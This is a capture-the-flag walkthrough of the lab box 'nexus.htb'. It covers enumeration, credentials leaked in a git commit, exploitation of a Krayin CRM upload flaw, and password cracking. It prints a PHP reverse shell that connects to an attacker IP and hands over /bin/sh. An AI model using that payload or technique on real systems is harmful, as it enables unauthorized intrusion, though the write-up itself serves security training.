We start with basic enumeration:

```bash 
nmap -sV -sC 10.129.234.54

echo "110.129.234.54 nexus.htb" | sudo tee -a /etc/hosts
```

![](images/Pasted%20image%2020260625064713.png)

We take a look of what we got:

![](images/Pasted%20image%2020260625064854.png)


After mapping the web page we found:

![](images/Pasted%20image%2020260625065133.png)
We are going to keep this user in mind:
```php
hiring manager: [j.matthew@nexus.htb]    (mailto:j.matthew@nexus.htb)
```


Now we move to directories and subdomains busting:

```bash
gobuster dir -u http://nexus.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt 

```

![](images/Pasted%20image%2020260625072319.png)

```bash
gobuster vhost -u http://nexus.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

![](images/Pasted%20image%2020260625072428.png)

We look at what we got:

![](images/Pasted%20image%2020260625074638.png)

After mapping the website no version of he mentioned technologies[Krayin - Webkul] were found!
now we move to subdomain directory busting:

```bash
gobuster dir -u http://billing.nexus.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

gobuster dir -u http://git.nexus.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

![](images/Pasted%20image%2020260625075423.png)
![](images/Pasted%20image%2020260625075451.png)

Nothing interesting within the **billing** subdomain since everything needs authentication.

![](images/Pasted%20image%2020260625075254.png)

For the **git** subdomain, some interesting things were found:
![](images/Pasted%20image%2020260625081010.png)

**Mapping time!**

![](images/Pasted%20image%2020260625081115.png)

Remember the previous email? [j.matthew@nexus.htb] the name might belong to Matthew.

Now diving into admin:

![](images/Pasted%20image%2020260625081929.png)

We notice that the mail service IMAP is accessible through [imap.nexus.htb] with:
user: username1  / password1
Plus there is two commits by admin, let us look into that first:

![](images/Pasted%20image%2020260625082959.png)

We can see that latest commit made two changes to the config where it switched the **APP_URL** form http://nexus.htb to http://billing.nexus.htb
And also removed the DB password which is: ==N27xh!!2ucY04==

Now we have two emails and two password + 3 usernames, let us try them all, nothing to loose!

![](images/Pasted%20image%2020260625084920.png)

j.matthew@nexus.htb + N27xh!!2ucY04   were the right credentials

**Mapping time!**

![](images/Pasted%20image%2020260625085124.png)

It turns out the Krayin version is 2.2.0 which by a simple google search we get that there is a CVE for it: ==CVE-2026-38526== which allows a **RCE**

https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md

## Step 1:
We retrieve our singed user's token/cookie

![](images/Pasted%20image%2020260625090227.png)

## Step 2:
we upload the php shell using the **XSRF-TOKEN** (original & raw) + **krayin_crm_session**

**BurpSuite time!**

![](images/Pasted%20image%2020260625093723.png)

We replaced the PNG image content with a php reverse shell and changed the file name too!

  ![](images/Pasted%20image%2020260625093933.png)
  
  ```php
  <?php
$sock=fsockopen("10.10.15.155",4445);
$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
  ```

And let us get a proper shell:

![](images/Pasted%20image%2020260625094344.png)

Since we know there is a database we might as well try to dump its content, but first let us check the .env file,, it may have something we need:

![](images/Pasted%20image%2020260625102959.png)

So now we got the DB password, time to access it and look for sensitive info:

![](images/Pasted%20image%2020260625103155.png)

It turns out his name was James fter all, LOL.
now we crack use hashcat to crack the password:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlist/rockyou.txt
```

while the hashcat command is running:

![](images/Pasted%20image%2020260625104239.png)

Earlier we knew that Jones is a user now we have James in the DB but does not have a /home directory, s we might as well try the new found password on old Jones

![](images/Pasted%20image%2020260625104423.png)

**user flag retrieved!**

![](images/Pasted%20image%2020260625104611.png)

Now we must escalate privileges.
after getting a close end in the open listening ports and the capabilities, ...etc

We land on:

```bash
systemctl list-timers
```
![](images/Pasted%20image%2020260701183141.png)
